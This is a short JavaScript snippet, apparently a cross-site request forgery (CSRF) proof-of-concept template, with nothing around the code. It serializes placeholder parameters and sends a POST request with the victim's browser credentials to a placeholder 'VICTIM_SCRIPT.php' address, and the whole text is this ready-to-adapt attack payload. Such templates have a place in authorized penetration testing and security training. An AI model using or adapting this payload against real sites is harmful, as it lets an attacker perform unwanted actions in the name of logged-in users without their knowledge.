var url =  "http://URL/VICTIM_SCRIPT.php";
var params = {
    "param1" : "test1",
    "param2" : "test2",
};
//Serialize the data without using JQuery
var queryParams = Object.keys(params).reduce(function(a, k) {
    a.push(k + '=' + encodeURIComponent(params[k]));
    return a
}, []).join('&');
var CSRF = new XMLHttpRequest();
CSRF.open("POST", url, true);
CSRF.withCredentials = 'true';
CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
CSRF.send(queryParams);
